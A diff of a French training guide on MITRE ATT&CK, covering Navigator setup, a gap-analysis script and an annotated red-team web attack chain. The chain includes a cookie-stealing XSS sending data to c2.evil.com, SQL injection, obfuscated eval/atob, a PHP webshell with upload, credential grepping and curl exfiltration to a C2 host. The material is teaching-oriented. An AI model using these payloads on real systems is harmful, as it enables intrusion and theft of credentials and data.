@@ -323,51 +323,73 @@ L'**ATT&CK Navigator** est un outil web open source développé par MITRE qui pe
 #### Méthode 1 : Docker (recommandée)
 
 ```bash
-# Étape 1 : Cloner le dépôt officiel
+# Étape 1 : Cloner le dépôt officiel de l'ATT&CK Navigator depuis GitHub
+# git clone télécharge l'intégralité du dépôt (branche par défaut : main)
 git clone https://github.com/mitre-attack/attack-navigator.git
 
-# Étape 2 : Se placer dans le répertoire
+# Étape 2 : Se placer dans le répertoire racine du projet cloné
+# cd = change directory ; nécessaire pour exécuter les commandes suivantes
 cd attack-navigator
 
-# Étape 3 : Construire l'image Docker
-# Le Dockerfile se trouve à la racine du projet
+# Étape 3 : Construire l'image Docker localement à partir du Dockerfile
+# docker build lit le Dockerfile à la racine et crée une image nommée
+# -t attack-navigator : tag / nom de l'image (on pourra la référencer plus tard)
+# . (point) = contexte de build : répertoire courant contenant le Dockerfile
 docker build -t attack-navigator .
 
-# Étape 4 : Lancer le conteneur
-# Le port 4200 est utilisé par défaut (port d'écoute de l'application Angular)
+# Étape 4 : Lancer le conteneur en arrière-plan (mode détaché)
+# -d (--detach) : le conteneur tourne sans bloquer le terminal
+# -p 4200:4200 : mappe le port 4200 de l'hôte vers le port 4200 du conteneur
+# --name attack-navigator : nom symbolique du conteneur pour le manipuler facilement
 docker run -d -p 4200:4200 --name attack-navigator attack-navigator
 
-# Étape 5 : Accéder à l'interface
+# Étape 5 : Accéder à l'interface utilisateur dans le navigateur
+# L'application Angular écoute par défaut sur le port 4200 en HTTP
 # Ouvrir un navigateur à l'adresse : http://localhost:4200
 ```
 
-**Explication des commandes Docker :**
+**Explication des commandes :**
 
-| Option | Signification |
+| Commande / Option | Rôle / Explication |
 |---|---|
-| `-t` | Tag de l'image (nom) |
-| `-d` | Détaché (tourne en arrière-plan) |
-| `-p 4200:4200` | Mappe le port 4200 du conteneur vers le port 4200 de l'hôte |
-| `--name` | Nom du conteneur |
+| `git clone` | Télécharge l'intégralité d'un dépôt Git distant en local |
+| `cd attack-navigator` | Se déplace dans le répertoire du projet pour y travailler |
+| `docker build -t attack-navigator .` | Construit une image Docker à partir du Dockerfile ; `-t` donne un nom (tag) à l'image ; `.` désigne le répertoire courant comme contexte |
+| `docker run -d -p 4200:4200 --name attack-navigator attack-navigator` | Crée et démarre un conteneur ; `-d` = arrière-plan (détaché) ; `-p` = mappage de ports hôte→conteneur ; `--name` = nom du conteneur ; `attack-navigator` = nom de l'image à instancier |
+| `http://localhost:4200` | URL d'accès à l'interface web ; localhost = machine locale ; 4200 = port par défaut de l'application Angular |
 
 #### Méthode 2 : Node.js (alternative)
 
 ```bash
-# Étape 1 : Cloner le dépôt
+# Étape 1 : Cloner le dépôt officiel de l'ATT&CK Navigator depuis GitHub
+# Alternative à Docker : utilisation de Node.js en local
 git clone https://github.com/mitre-attack/attack-navigator.git
 
-# Étape 2 : Se placer dans le répertoire
+# Étape 2 : Se placer dans le répertoire racine du projet
 cd attack-navigator
 
-# Étape 3 : Installer les dépendances
+# Étape 3 : Installer toutes les dépendances JavaScript listées dans package.json
+# npm = Node Package Manager ; télécharge les librairies requises (Angular, etc.)
+# Les dépendances sont installées dans le dossier node_modules/
 npm install
 
-# Étape 4 : Lancer le serveur de développement
+# Étape 4 : Lancer le serveur de développement Angular
+# npm start exécute la commande définie dans la section "scripts" du package.json
+# Le serveur compile l'application et la sert sur http://localhost:4200
 npm start
 
-# Étape 5 : Accéder à l'interface
+# Étape 5 : Accéder à l'interface utilisateur dans le navigateur
 # http://localhost:4200
 ```
+
+**Explication des commandes :**
+
+| Commande | Rôle / Explication |
+|---|---|
+| `git clone` | Télécharge le dépôt Git distant pour récupérer le code source de Navigator |
+| `cd attack-navigator` | Se place dans le dossier du projet pour exécuter les commandes npm |
+| `npm install` | Installe toutes les dépendances JavaScript (Angular, RxJS, etc.) définies dans `package.json` ; crée le dossier `node_modules/` |
+| `npm start` | Lance le serveur de développement Angular (compile le TypeScript et sert l'application en temps réel avec rechargement à chaud) |
 
 ### 5.3 Utilisation basique
 
@@ -392,20 +414,24 @@ Pour modifier la palette de couleurs d'une heat map :
 
 #### Exporter / Importer une couche
 
-```bash
-# Export du fichier JSON depuis l'interface
-# 1. Cliquer sur l'icône "Download" (⬇) dans la barre d'outils
-# 2. Choisir "Download as JSON"
-# 3. Enregistrer le fichier (ex: heatmap_detection.json)
-```
+1. Ouvrir ATT&CK Navigator dans le navigateur
+2. Créer ou charger une couche (layer)
+3. Cliquer sur l'icône **"Download"** (⬇) dans la barre d'outils
+4. Choisir **"Download as JSON"** pour exporter au format structuré
+5. Sauvegarder le fichier (ex: `detection_current.json`)
 
 **Import d'une couche existante :**
 
-```bash
-# 1. Cliquer sur "Open Existing Layer" → "Upload from file"
-# 2. Sélectionner le fichier JSON
-# 3. La couche s'affiche avec toutes ses annotations
-```
+1. Cliquer sur **"Open Existing Layer"** → **"Upload from file"**
+2. Sélectionner le fichier JSON précédemment exporté
+3. La couche s'affiche dans l'interface avec toutes ses techniques, scores et commentaires
+
+**Explication :**
+
+| Action | Description |
+|---|---|
+| Export JSON | Sauvegarde la couche active (techniques, scores, couleurs, commentaires) dans un fichier `.json` portable |
+| Import JSON | Charge une couche existante depuis un fichier JSON pour la visualiser ou la modifier dans Navigator |
 
 ### 5.4 Format du fichier JSON
 
@@ -464,15 +490,55 @@ Exemple de fichier de couche ATT&CK Navigator :
 
 Voici une chaîne d'attaque web réaliste d'un **Red Team** contre une application web d'e-commerce, mappée sur MITRE ATT&CK :
 
+> **Prérequis — Installation des outils de reconnaissance :**
+> ```bash
+> # Installation de ffuf (Fuzz Faster U Fool) via le gestionnaire de paquets apt
+> # ffuf = outil de fuzzing web pour découvrir des ressources cachées (sous-domaines, chemins)
+> # -y = répond "oui" automatiquement aux demandes de confirmation
+> sudo apt install -y ffuf
+>
+> # Installation de gau (Get All URLs) via le gestionnaire de paquets Go
+> # gau = outil qui récupère toutes les URLs connues d'un domaine depuis l'OSINT passif
+> # @latest = télécharge la dernière version publiée du module
+> go install github.com/lc/gau/v2/cmd/gau@latest
+> ```
+> *Voir le [README](README.md) pour les alternatives.*
+
+**Explication des commandes :**
+
+| Commande | Rôle / Explication |
+|---|---|
+| `sudo apt install -y ffuf` | Installe `ffuf` (outil de fuzzing web pour brute-force de répertoires/sous-domaines) ; `sudo` = exécution en super-utilisateur ; `-y` = mode non-interactif (pas de confirmation manuelle) |
+| `go install ...@latest` | Installe `gau` (Get All URLs) depuis le registre Go ; `gau` collecte les URLs connues d'un domaine via des sources OSINT (Wayback Machine, AlienVault, etc.) ; `@latest` = version la plus récente |
+
 #### Phase 1 : Reconnaissance (TA0043)
 
 ```bash
-# Scan des sous-domaines
+# Scan des sous-domaines avec ffuf (Fuzz Faster U Fool)
+# -u  : URL cible avec le mot-clé FUZZ qui sera remplacé par chaque entrée de la wordlist
+# -w  : wordlist contenant les sous-domaines à tester (ex: admin, api, dev, mail...)
+# -H  : en-tête HTTP personnalisé ; FUZZ est la variable de substitution dans le Host
+# -fc : filtre les réponses dont le code HTTP correspond (301 = redirection, souvent inintéressant)
+# === ILLUSTRATION — Adapter à votre cible ===
+# Remplacer cible.com par le domaine du lab (ex: ecovault.local ou redteam.lab)
+# Créer une mini-wordlist :
+echo -e "www\nadmin\napi\ndev\nmail" > subdomains.txt
+
 ffuf -u https://cible.com -w subdomains.txt -H "Host: FUZZ.cible.com" -fc 301
 
-# Découverte des endpoints API
+# Découverte des endpoints API via gau (Get All URLs) et filtrage par grep
+# gau --o : interroge les bases OSINT (Wayback, AlienVault, etc.) pour ce domaine
+# grep "/api/" : ne conserve que les lignes contenant "/api/" (endpoints d'API)
 gau --o cible.com | grep "/api/"
 ```
+
+**Explication des commandes :**
+
+| Commande / Option | Rôle / Explication |
+|---|---|
+| `ffuf -u https://cible.com -w subdomains.txt -H "Host: FUZZ.cible.com" -fc 301` | Outil de fuzzing web ; `-u` = URL avec emplacement `FUZZ` ; `-w` = wordlist en entrée ; `-H` = en-tête HTTP personnalisé (ici `Host`) ; `-fc 301` = ignore les codes HTTP 301 (redirections) |
+| `gau --o cible.com` | Récupère toutes les URLs connues pour `cible.com` via l'OSINT passif (Wayback Machine, VirusTotal, AlienVault OTX, etc.) ; `--o` = mode sortie standard |
+| `grep "/api/"` | Filtre les lignes contenant `/api/` pour ne conserver que les endpoints d'API REST |
 
 | Technique | Code | Description |
 |---|---|---|
@@ -483,15 +549,47 @@ gau --o cible.com | grep "/api/"
 #### Phase 2 : Resource Development (TA0042)
 
 ```bash
-# Configuration d'un serveur C2 avec HTTPS
+# Configuration d'un serveur C2 avec HTTPS : génération d'un certificat auto-signé
+# openssl req = outil de génération de requêtes / certificats X.509
+# -x509 : génère directement un certificat auto-signé (au lieu d'une requête CSR)
+# -nodes : ne chiffre PAS la clé privée avec une passphrase (nécessaire pour un démarrage automatique)
+# -days 365 : validité du certificat = 1 an
+# -newkey rsa:2048 : génère une nouvelle clé RSA de 2048 bits (taille standard sécurisée)
+# -keyout : chemin de sortie pour la clé privée
+# -out : chemin de sortie pour le certificat
+# -subj : sujet (identité) du certificat ; /CN = Common Name (nom de domaine)
+# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
+# Nécessite sudo pour écrire dans /etc/ssl/
 openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
     -keyout /etc/ssl/c2.key \
     -out /etc/ssl/c2.crt \
     -subj "/CN=maj-logiciel-update.com"
 
-# Hébergement d'un payload
+# Hébergement d'un payload via le serveur HTTP intégré de Python
+# python3 -m http.server : lance le module serveur HTTP simple de Python
+# 443 : port d'écoute (port HTTPS standard, souvent filtré en sortie)
+# Le répertoire courant devient la racine web (payload accessible en téléchargement)
 python3 -m http.server 443
 ```
+
+**Explication des commandes :**
+
+| Commande / Option | Rôle / Explication |
+|---|---|
+| `openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ... -out ... -subj ...` | Génère un certificat SSL/TLS auto-signé ; `-x509` = certificat direct (pas de CSR) ; `-nodes` = pas de passphrase sur la clé ; `-days` = durée de validité ; `-newkey rsa:2048` = crée une clé RSA 2048 bits ; `-keyout` = fichier de sortie pour la clé privée ; `-out` = fichier de sortie pour le certificat ; `-subj` = sujet X.509 avec `/CN=` (Common Name = nom de domaine) |
+| `python3 -m http.server 443` | Lance un serveur HTTP minimaliste en Python sur le port 443 ; le répertoire courant sert de racine web ; utilisé ici pour diffuser un payload malveillant |
+
+**Explication des flags OpenSSL :**
+
+| Flag | Rôle |
+|---|---|
+| `-x509` | Génère un certificat auto-signé plutôt qu'une requête de signature (CSR) |
+| `-nodes` | "No DES" : ne chiffre pas la clé privée avec une passphrase (évite une demande manuelle au démarrage) |
+| `-days 365` | Durée de validité du certificat en jours |
+| `-newkey rsa:2048` | Crée une nouvelle clé RSA de 2048 bits |
+| `-keyout` | Chemin de destination pour la clé privée |
+| `-out` | Chemin de destination pour le certificat |
+| `-subj "/CN=..."` | Sujet du certificat ; le Common Name (`CN`) doit correspondre au nom de domaine du C2 |
 
 | Technique | Code | Description |
 |---|---|---|
@@ -500,10 +598,23 @@ python3 -m http.server 443
 
 #### Phase 3 : Initial Access (TA0001)
 
-```python
-# Payload XSS stocké envoyé via un formulaire de contact
-<script>fetch('https://c2.evil.com/steal?c='+document.cookie)</script>
+```html
+<!-- Payload XSS stocké (Stored Cross-Site Scripting) envoyé via un formulaire de contact -->
+<!-- Le navigateur de la victime exécutera ce script lors de l'affichage de la page -->
+<script>
+  // fetch() = envoie une requête HTTP vers le serveur C2 avec les cookies de la session victime
+  // document.cookie = contient les cookies HTTP de la page courante (cookies de session, tokens)
+  // L'URL c2.evil.com/steal reçoit les cookies en paramètre GET (?c=...)
+  fetch('https://c2.evil.com/steal?c=' + document.cookie)
+</script>
 ```
+
+**Décomposition :**
+
+| Partie | Explication |
+|---|---|
+| `<script>...</script>` | Balise HTML qui encapsule du code JavaScript exécuté côté client (navigateur) |
+| `fetch('https://c2.evil.com/steal?c=' + document.cookie)` | Envoie une requête HTTP GET vers le serveur C2 ; `document.cookie` lit tous les cookies de la page (jetons de session, authentification) ; les cookies sont passés en paramètre GET `?c=` pour exfiltration |
 
 | Technique | Code | Description |
 |---|---|---|
@@ -512,14 +623,45 @@ python3 -m http.server 443
 #### Phase 4 : Execution (TA0002) + Defense Evasion (TA0005)
 
 ```sql
--- Injection SQL dans le paramètre 'id'
+-- Injection SQL dans le paramètre 'id' de la requête
+-- Le guillemet simple ferme la chaîne SQL existante dans la requête initiale
+-- UNION SELECT : fusionne les résultats de la requête d'origine avec notre sélection
+-- null,username,password,null : colonnes injectées pour correspondre au nombre de colonnes attendu
+--   (null sert de placeholder pour les colonnes dont on ignore le type)
+-- FROM users : table contenant les identifiants (cible de l'attaque)
+-- -- - : commentaire SQL qui ignore la suite de la requête originale (évite les erreurs de syntaxe)
 ' UNION SELECT null,username,password,null FROM users-- -
 ```
 
 ```javascript
-// Obfuscation JavaScript pour contourner les WAF
+// Obfuscation JavaScript pour contourner les WAF (Web Application Firewalls)
+// eval() : exécute une chaîne de caractères comme du code JavaScript
+// atob() : décode une chaîne en Base64 (encodage à 64 caractères)
+// La chaîne Base64 "ZmV0Y2goJy8uLi8uLi8uLi9ldGMvcGFzc3dkJyk="
+//   correspond à : fetch('/../../../../etc/passwd')
+//   après décodage, eval exécute cette requête qui tente un Path Traversal
 eval(atob("ZmV0Y2goJy8uLi8uLi8uLi9ldGMvcGFzc3dkJyk="))
 ```
+
+**Explication des commandes SQL :**
+
+| Partie | Explication |
+|---|---|
+| `'` | Guillemet simple qui ferme la chaîne de caractères dans la requête SQL originale (provoque une erreur si la validation est absente) |
+| `UNION SELECT` | Mot-clé SQL qui fusionne les résultats de la requête d'origine avec ceux de la seconde requête |
+| `null` | Placeholder pour une colonne (permet d'aligner le nombre de colonnes sans connaître leur type) |
+| `username, password` | Colonnes ciblées de la table `users` qui contiennent les identifiants |
+| `FROM users` | Table contenant les comptes utilisateurs de l'application |
+| `-- -` | Commentaire SQL qui neutralise le reste de la requête originale (empêche les erreurs de syntaxe) |
+
+**Explication des commandes JavaScript :**
+
+| Fonction / Élément | Rôle / Explication |
+|---|---|
+| `eval()` | Exécute une chaîne de caractères comme du code JavaScript (danger : exécution de code arbitraire) |
+| `atob()` | Decode une chaîne Base64 en chaîne ASCII (ASCII to Binary) ; utilisé ici pour masquer le vrai code |
+| `"ZmV0Y2goJy8uLi8uLi8uLi9ldGMvcGFzc3dkJyk="` | Chaîne Base64 qui, décodée, donne : `fetch('/../../../../etc/passwd')` — tentative de Path Traversal pour lire le fichier `/etc/passwd` |
+| `fetch('/../../../../etc/passwd')` | Requête HTTP qui tente d'accéder au fichier `/etc/passwd` en remontant les répertoires (`..`) |
 
 | Technique | Code | Description |
 |---|---|---|
@@ -528,15 +670,45 @@ eval(atob("ZmV0Y2goJy8uLi8uLi8uLi9ldGMvcGFzc3dkJyk="))
 
 #### Phase 5 : Persistence (TA0003) + Privilege Escalation (TA0004)
 
-```python
-# Création d'un webshell pour persistance
-<?php system($_GET['cmd']); ?>
+```php
+<?php
+// Création d'un webshell PHP pour établir une persistance sur le serveur
+// system() : fonction PHP qui exécute une commande shell et affiche la sortie
+// $_GET['cmd'] : récupère le paramètre "cmd" passé dans l'URL en GET
+//   Exemple d'utilisation : https://cible.com/uploads/shell.php?cmd=whoami
+//   Résultat : exécute la commande "whoami" sur le serveur et retourne le résultat
+system($_GET['cmd']);
+?>
 ```
 
 ```bash
-# Upload du webshell
+# Upload du webshell vers le serveur cible via une requête HTTP POST multipart
+# curl : outil en ligne de commande pour effectuer des requêtes HTTP
+# -X POST : méthode HTTP POST (envoi de données, ici un fichier)
+# -F "file=@shell.php" : simule un formulaire HTML multipart ;
+#   "file" = nom du champ attendu par l'application ;
+#   "@shell.php" = contenu du fichier local à envoyer
+# L'URL cible est le point de terminaison de téléchargement de l'application
 curl -X POST -F "file=@shell.php" https://cible.com/uploads/
 ```
+
+**Explication du webshell :**
+
+| Élément | Rôle / Explication |
+|---|---|
+| `<?php ... ?>` | Balises d'ouverture et fermeture du langage PHP (le serveur exécute le code entre ces balises) |
+| `system()` | Fonction PHP qui exécute une commande système et envoie la sortie directement dans la réponse HTTP |
+| `$_GET['cmd']` | Variable superglobale PHP qui récupère le paramètre `cmd` de l'URL (ex: `?cmd=whoami`) |
+| Commande : `?cmd=whoami` | Exemple d'utilisation : `https://cible.com/shell.php?cmd=whoami` retourne le nom de l'utilisateur système (ex: `www-data`) |
+
+**Explication de la commande curl :**
+
+| Option | Rôle / Explication |
+|---|---|
+| `curl` | Outil CLI de transfert de données via URL (HTTP, FTP, etc.) |
+| `-X POST` | Force la méthode HTTP POST (envoi de données au serveur) |
+| `-F "file=@shell.php"` | Simule un formulaire HTML avec champ fichier ; `file` = nom du champ ; `@shell.php` = chemin local du fichier à envoyer |
+| `https://cible.com/uploads/` | URL du point de terminaison qui accepte les téléversements de fichiers côté serveur |
 
 | Technique | Code | Description |
 |---|---|---|
@@ -546,12 +718,32 @@ curl -X POST -F "file=@shell.php" https://cible.com/uploads/
 #### Phase 6 : Credential Access (TA0006) + Discovery (TA0007)
 
 ```bash
-# Dump des hashs depuis le fichier de configuration
+# Dump des identifiants depuis le fichier de configuration de l'application web
+# cat : affiche le contenu du fichier config.php
+# | (pipe) : redirige la sortie de cat vers l'entrée de grep
+# grep -E : recherche avec une expression régulière étendue
+# "DB_PASSWORD|DB_USER" : cherche les lignes contenant DB_PASSWORD OU DB_USER
 cat /var/www/html/config.php | grep -E "DB_PASSWORD|DB_USER"
 
-# Découverte des autres machines du réseau
+# Découverte des autres machines du réseau interne par ping sweep
+# for i in $(seq 1 254) : boucle sur les adresses IP 10.0.0.1 à 10.0.0.254
+# ping -c 1 : envoie un seul paquet ICMP Echo Request à chaque adresse
+# grep "bytes from" : ne conserve que les réponses positives (machine active)
+# & (et commercial) : exécute chaque ping en arrière-plan (parallélisation)
+# done : fin de la boucle
 for i in $(seq 1 254); do ping -c 1 10.0.0.$i | grep "bytes from" & done
 ```
+
+**Explication des commandes :**
+
+| Commande / Option | Rôle / Explication |
+|---|---|
+| `cat /var/www/html/config.php` | Affiche le contenu du fichier de configuration PHP (contient souvent les identifiants de base de données en clair) |
+| `grep -E "DB_PASSWORD\|DB_USER"` | Filtre les lignes contenant les chaînes `DB_PASSWORD` ou `DB_USER` ; `-E` = regex étendue ; `\|` = opérateur OU dans la regex |
+| `for i in $(seq 1 254); do ... done` | Boucle shell qui itère de 1 à 254 (généré par `seq`) pour scanner un sous-réseau |
+| `ping -c 1 10.0.0.$i` | Envoie un paquet ICMP Echo Request à chaque IP du réseau ; `-c 1` = un seul paquet |
+| `grep "bytes from"` | Filtre la sortie de ping : si une machine répond, la ligne contient "bytes from" |
+| `&` | Exécute chaque commande ping en arrière-plan pour paralléliser le scan (beaucoup plus rapide qu'une exécution séquentielle) |
 
 | Technique | Code | Description |
 |---|---|---|
@@ -561,12 +753,36 @@ for i in $(seq 1 254); do ping -c 1 10.0.0.$i | grep "bytes from" & done
 #### Phase 7 : Lateral Movement (TA0008) + Collection (TA0009)
 
 ```bash
-# Connexion SSH avec les identifiants volés
+# Connexion SSH vers le serveur cible avec les identifiants volés (mouvement latéral)
+# ssh : Secure Shell — protocole de connexion distante chiffrée
+# admin@10.0.0.25 : utilisateur "admin" sur la machine 10.0.0.25 (serveur de base de données)
+# La connexion interactive permet d'exécuter des commandes sur la machine distante
 ssh admin@10.0.0.25
 
-# Compression des fichiers sensibles avant exfiltration
+# Compression des fichiers sensibles en vue d'une exfiltration
+# tar : Tape ARchive — outil d'archivage de fichiers
+# czf : flags combinés (voir tableau ci-dessous)
+# data.tar.gz : nom du fichier d'archive compressée en sortie
+# /var/backups/sql/ : répertoire source contenant les dumps de base de données à archiver
 tar czf data.tar.gz /var/backups/sql/
 ```
+
+**Explication des commandes :**
+
+| Commande / Option | Rôle / Explication |
+|---|---|
+| `ssh admin@10.0.0.25` | Connexion SSH à la machine distante 10.0.0.25 avec l'utilisateur `admin` ; `ssh` = chiffre le trafic entre les deux machines |
+| `tar czf data.tar.gz /var/backups/sql/` | Crée une archive compressée ; voir détails des flags ci-dessous |
+
+**Explication des flags tar :**
+
+| Flag | Rôle |
+|---|---|
+| `c` | Create — crée une nouvelle archive (mode création) |
+| `z` | GZip — compresse l'archive avec l'algorithme gzip (produit un `.tar.gz`) |
+| `f` | File — spécifie le nom du fichier d'archive en sortie (`data.tar.gz`) |
+| `data.tar.gz` | Nom du fichier d'archive produit (contient les données compressées) |
+| `/var/backups/sql/` | Répertoire source dont le contenu est archivé récursivement |
 
 | Technique | Code | Description |
 |---|---|---|
@@ -576,12 +792,36 @@ tar czf data.tar.gz /var/backups/sql/
 #### Phase 8 : Command and Control (TA0011)
 
 ```bash
-# Communication C2 via DNS tunneling
+# Communication C2 via DNS tunneling (exfiltration cachée dans les requêtes DNS)
+# nslookup : outil de résolution DNS (interroge les serveurs DNS)
+# -type=TXT : interroge les enregistrements TXT d'un domaine
+#   Les enregistrements TXT peuvent contenir des données arbitraires
+#   Le serveur C2 encode ses instructions dans la réponse DNS TXT
+# Cette technique contourne les pare-feux car le DNS est rarement filtré
 nslookup -type=TXT exfil.c2-domain.com
 
-# Exfiltration via HTTP POST
+# Exfiltration des données via HTTP POST vers le serveur C2
+# curl -X POST : requête HTTP POST (envoi de données dans le corps)
+# -d @data.tar.gz : envoie le contenu du fichier local data.tar.gz dans le corps de la requête
+#   @ = préfixe indiquant un fichier plutôt qu'une chaîne littérale
+# L'URL https://c2.evil.com/exfil est le point de réception côté attaquant
+# Le trafic HTTPS est chiffré et se mélange au trafic web légitime
 curl -X POST -d @data.tar.gz https://c2.evil.com/exfil
 ```
+
+**Explication des commandes :**
+
+| Commande / Option | Rôle / Explication |
+|---|---|
+| `nslookup -type=TXT exfil.c2-domain.com` | Interroge le DNS pour les enregistrements TXT du domaine ; `-type=TXT` = filtre sur le type d'enregistrement ; les enregistrements TXT peuvent contenir des instructions encodées par le C2 |
+| `curl -X POST -d @data.tar.gz https://c2.evil.com/exfil` | Envoie les données volées au serveur C2 via HTTP POST ; `-X POST` = méthode POST ; `-d @data.tar.gz` = envoie le fichier `data.tar.gz` dans le corps de la requête ; HTTPS chiffre le transfert |
+
+**Explication des flags curl :**
+
+| Flag | Rôle |
+|---|---|
+| `-X POST` | Spécifie la méthode HTTP POST (envoi de données dans le corps de la requête) |
+| `-d @data.tar.gz` | Définit les données à envoyer ; `@` = le contenu est lu depuis un fichier ; utile pour exfiltrer des fichiers volumineux |
 
 | Technique | Code | Description |
 |---|---|---|
@@ -634,11 +874,8 @@ En fin de mission, le Red Team présente une **matrice de couverture** qui répo
 La **gap analysis** compare l'état actuel de la défense (baseline) avec l'état souhaité (target).
 
 ```bash
-# Script simple de comparaison entre deux fichiers JSON de couches Navigator
-# Ce script compare une couche "actuelle" et une couche "cible"
-# et identifie les techniques non couvertes
-
-cat compare_layers.py
+# Sauvegarder le script de comparaison :
+cat > compare_layers.py << 'PYEOF'
 ```
 
 ```python
@@ -653,57 +890,107 @@ Ce script identifie les techniques présentes dans la couche cible
 mais absentes ou faiblement scorées dans la couche actuelle.
 """
 
-import json
-import sys
+import json      # Module pour lire/écrire du JSON (format des couches Navigator)
+import sys       # Module pour accéder aux arguments de la ligne de commande (argv)
 
 def load_layer(filepath):
+    """
+    Charge une couche ATT&CK depuis un fichier JSON.
+    Retourne un dictionnaire {techniqueID: {score, comment}}.
+    - filepath : chemin vers le fichier JSON de la couche
+    """
+    # Ouverture et lecture du fichier JSON
     with open(filepath, 'r') as f:
-        data = json.load(f)
+        data = json.load(f)              # Parse le JSON en dictionnaire Python
+
     techniques = {}
+    # Parcours de la liste des techniques dans le fichier de couche
     for t in data.get('techniques', []):
-        techniques[t['techniqueID']] = {
-            'score': t.get('score', 0),
-            'comment': t.get('comment', '')
+        # Extraction de l'ID technique (ex: "T1190") et sous-technique si existante
+        tech_id = t['techniqueID']
+        techniques[tech_id] = {
+            'score': t.get('score', 0),          # Score de couverture (0-100), défaut 0
+            'comment': t.get('comment', '')       # Commentaire associé, défaut chaîne vide
         }
     return techniques
 
 def main():
+    # Vérification du nombre d'arguments
+    # sys.argv[0] = nom du script, sys.argv[1] = current.json, sys.argv[2] = target.json
     if len(sys.argv) != 3:
         print("Usage: python3 compare_layers.py current.json target.json")
-        sys.exit(1)
+        sys.exit(1)                              # Quitte le script avec code d'erreur 1
 
-    current = load_layer(sys.argv[1])
-    target = load_layer(sys.argv[2])
+    # Chargement des deux couches
+    current = load_layer(sys.argv[1])             # Couche "état actuel" de la détection
+    target = load_layer(sys.argv[2])              # Couche "état cible" souhaité
 
-    print("=" * 80)
+    # Affichage de l'en-tête du rapport
+    print("=" * 80)                               # Ligne de séparation (80 tirets)
     print("GAP ANALYSIS — Techniques cibles non couvertes ou sous-couvertes")
     print("=" * 80)
 
-    gap_found = False
+    gap_found = False                             # Flag : au moins un gap détecté ?
+    # Pour chaque technique dans la couche cible
     for tech_id, tech_data in target.items():
+        # Récupération du score actuel (0 si technique absente)
         current_score = current.get(tech_id, {}).get('score', 0)
-        target_score = tech_data['score']
+        target_score = tech_data['score']          # Score souhaité
 
+        # Si le score actuel est inférieur au score cible → gap
         if current_score < target_score:
             gap_found = True
-            gap = target_score - current_score
+            gap = target_score - current_score     # Écart en points
+            # Statut : "ABSENTE" si score = 0, sinon "SOUS-COUVERTE"
             status = "ABSENTE" if current_score == 0 else f"SOUS-COUVERTE (gap: {gap} pts)"
+
+            # Affichage détaillé du gap
             print(f"\n{tech_id} — {status}")
             print(f"  Score actuel : {current_score}/100")
             print(f"  Score cible   : {target_score}/100")
             print(f"  Commentaire cible : {tech_data['comment']}")
 
+    # Si aucun gap n'a été trouvé
     if not gap_found:
         print("\n✅ Toutes les techniques cibles sont couvertes.")
 
+# Point d'entrée du script : exécuté seulement si le fichier est lancé directement
 if __name__ == "__main__":
     main()
 ```
 
+PYEOF
+chmod +x compare_layers.py
+
 ```bash
-# Exécution du script
+# Exécution du script de gap analysis avec deux fichiers JSON
+# python3 : interpréteur Python 3
+# compare_layers.py : script à exécuter
+# detection_current.json : couche représentant l'état actuel de la détection
+# nis2_target.json : couche cible correspondant aux exigences NIS2
+# Le script compare les deux et affiche les techniques non couvertes ou sous-couvertes
 python3 compare_layers.py detection_current.json nis2_target.json
 ```
+
+**Explication du script Python :**
+
+| Élément | Rôle / Explication |
+|---|---|
+| `load_layer(filepath)` | Fonction qui ouvre un fichier JSON et extrait les techniques avec leur score et commentaire dans un dictionnaire |
+| `json.load(f)` | Parse le contenu du fichier JSON en structures Python (dictionnaires, listes) |
+| `data.get('techniques', [])` | Récupère la liste des techniques ; retourne une liste vide si la clé est absente |
+| `len(sys.argv) != 3` | Vérifie que l'utilisateur a bien fourni exactement 2 arguments (fichiers current et target) |
+| `current.get(tech_id, {}).get('score', 0)` | Récupère le score d'une technique dans la couche actuelle ; retourne 0 si la technique est absente |
+| `if __name__ == "__main__"` | Condition d'exécution : le code sous ce bloc ne s'exécute que si ce fichier est lancé directement (pas importé comme module) |
+
+**Explication de la commande d'exécution :**
+
+| Argument | Rôle |
+|---|---|
+| `python3` | Interpréteur Python version 3 (obligatoire pour exécuter un script `.py`) |
+| `compare_layers.py` | Le script Python qui réalise l'analyse comparative |
+| `detection_current.json` | Fichier JSON de la couche actuelle (état réel de la détection) |
+| `nis2_target.json` | Fichier JSON de la couche cible (objectif à atteindre selon NIS2) |
 
 **Sortie typique :**
 
@@ -864,24 +1151,47 @@ Utilisez le site [https://attack.mitre.org](https://attack.mitre.org) ou le fich
 Suivez les instructions de la section 5 avec Docker.
 
 ```bash
-# Vérifier que Docker est installé
+# Vérifier que Docker est bien installé sur le système
+# docker --version : affiche la version installée de Docker
+# Si la commande échoue, Docker n'est pas installé → revenir à la section 5.2
 docker --version
 
-# Cloner le dépôt
+# Cloner le dépôt officiel de l'ATT&CK Navigator depuis GitHub
 git clone https://github.com/mitre-attack/attack-navigator.git
+
+# Se placer dans le répertoire du projet cloné
 cd attack-navigator
 
-# Build l'image
+# Construire l'image Docker à partir du Dockerfile
+# -t attack-navigator : nomme l'image pour la référencer facilement
 docker build -t attack-navigator .
 
-# Lancer le conteneur
+# Lancer le conteneur en arrière-plan
+# -d : mode détaché (arrière-plan)
+# -p 4200:4200 : mappage de ports (hôte:conteneur)
+# --name attack-navigator : nom du conteneur
 docker run -d -p 4200:4200 --name attack-navigator attack-navigator
 
-# Vérifier que le conteneur tourne
+# Vérifier que le conteneur est bien en cours d'exécution
+# docker ps : liste les conteneurs actifs
+# grep attack-navigator : filtre pour n'afficher que notre conteneur
 docker ps | grep attack-navigator
 
-# Accéder : http://localhost:4200
+# Accéder à l'interface web depuis le navigateur
+# http://localhost:4200
 ```
+
+**Explication des commandes :**
+
+| Commande / Option | Rôle / Explication |
+|---|---|
+| `docker --version` | Vérifie la présence de Docker et affiche le numéro de version installé |
+| `git clone ...` | Télécharge le code source du dépôt GitHub mitre-attack/attack-navigator |
+| `cd attack-navigator` | Se place dans le dossier du projet pour exécuter les commandes Docker |
+| `docker build -t attack-navigator .` | Construit l'image Docker ; `-t` = tag (nom de l'image) ; `.` = répertoire courant comme contexte |
+| `docker run -d -p 4200:4200 --name attack-navigator attack-navigator` | Lance le conteneur ; `-d` = arrière-plan ; `-p` = port mapping ; `--name` = nom du conteneur |
+| `docker ps | grep attack-navigator` | Liste les conteneurs actifs et filtre pour vérifier que le nôtre tourne |
+| `http://localhost:4200` | URL d'accès à l'interface web sur la machine locale |
 
 **Étape 3 : Créer la heat map** (20 min)
 
@@ -911,11 +1221,20 @@ docker ps | grep attack-navigator
